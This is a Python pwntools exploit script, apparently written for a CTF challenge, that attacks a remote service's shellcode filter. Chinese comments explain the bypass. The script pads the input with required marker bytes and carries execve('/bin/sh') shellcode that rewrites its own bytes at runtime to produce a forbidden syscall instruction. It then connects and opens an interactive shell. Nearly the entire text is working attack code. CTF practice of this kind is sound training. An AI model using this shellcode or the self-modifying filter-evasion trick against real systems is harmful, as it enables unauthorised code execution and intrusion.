from pwn import *
from keystone import Ks, KS_ARCH_X86, KS_MODE_64

context.arch = 'amd64'
context.os = 'linux'

HOST, PORT = 'ctf.adl.tw', 10003

# ============================================================
# main() 的過濾邏輯（詳見 shellcodeultimate_writeup.md / disasm_output.txt）：
#
#   char buf[0x90];
#   read(0, buf, 0x78);                 // 讀 120 bytes，沒有 overflow
#
#   掃過全部 120 bytes，禁止出現：
#     - 0x90                （NOP，擋 NOP sled）
#     - 連續的 0f 05          （syscall 指令本體）
#     - 連續的 cd 80          （int 0x80，32-bit 系統呼叫）
#
#   另外每隔 6 bytes（index 0, 6, 12, ..., 54）強制要求剛好是
#     0x0c, 0x87  （也就是機器碼 "or al, 0x87"）
#   10 組，等於佔掉前 60 bytes 裡的「2/6」，只留 4/6 bytes 給我們自由發揮。
#
#   兩層過濾都通過，才會把 buf 當函式指標呼叫 -> 執行我們的 shellcode。
#
# 繞過思路：
#   1. 前 60 bytes：照著要求，每 6 bytes 放 "0c 87"（或 al,0x87，無害）
#      + 4 bytes安全填充（這裡用 0xF8 = clc，單位元組、無副作用、不是 0x90）。
#   2. 真正的 shellcode 放在第 60 byte 之後（完全不受「每 6 bytes 一組標記」
#      限制的區域）：組一段 execve("/bin/sh") shellcode，但不要在「送出去
#      的 bytes」裡直接寫 0f 05——改成：
#        mov word ptr [rbx], 0x050e      ; 送出去的是安全的 0e 05
#        inc byte ptr [rbx]              ; 執行期間才讓它變成真正的 0f 05
#        jmp rbx                         ; 跳過去執行剛剛「自己寫出來」的 syscall
#      filter 只在程式一開始靜態掃過 buf 一次，不會管程式執行到一半自己
#      改寫了什�么記憶體——這就是繞過的縫隙。
# ============================================================

FILLER = 0xF8          # clc，1 byte、無副作用、不是 0x90
READ_LEN = 0x78        # 120


def build_real_shellcode():
    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    asm = '''
    xor rsi, rsi
    push rsi
    movabs rdi, 0x68732f6e69622f2f
    push rdi
    mov rdi, rsp
    xor rdx, rdx
    mov al, 0x3b
    lea rbx, [rip + 10]
    mov word ptr [rbx], 0x050e
    inc byte ptr [rbx]
    jmp rbx
    '''
    enc, _ = ks.asm(asm)
    return bytes(enc)


def build_payload():
    payload = b''
    for _ in range(10):
        payload += bytes([0x0c, 0x87]) + bytes([FILLER] * 4)
    assert len(payload) == 60

    payload += build_real_shellcode()

    pad = READ_LEN - len(payload)
    assert pad >= 0, 'real shellcode 太長，塞不進剩餘空間'
    payload += bytes([FILLER]) * pad
    assert len(payload) == READ_LEN
    return payload


def passes_filter(buf):
    """在本地先模擬一次二進位的過濾邏輯，送出前自我檢查。"""
    for i in range(0, 0x78):
        if buf[i] == 0x90:
            return False, f'NOP at {i}'
        if i <= 0x76:
            if buf[i] == 0x0f and buf[i + 1] == 0x05:
                return False, f'syscall bytes at {i}'
            if buf[i] == 0xcd and buf[i + 1] == 0x80:
                return False, f'int 0x80 bytes at {i}'
    for j in range(10):
        idx = 6 * j
        if not (buf[idx] == 0x0c and buf[idx + 1] == 0x87):
            return False, f'marker missing at block {j}'
    return True, None


def main():
    payload = build_payload()
    ok, reason = passes_filter(payload)
    assert ok, f'payload 沒通過本地模擬的過濾檢查: {reason}'

    p = remote(HOST, PORT, timeout=10)
    p.recvuntil(b'!!!')
    p.send(payload)
    p.interactive()


if __name__ == '__main__':
    main()
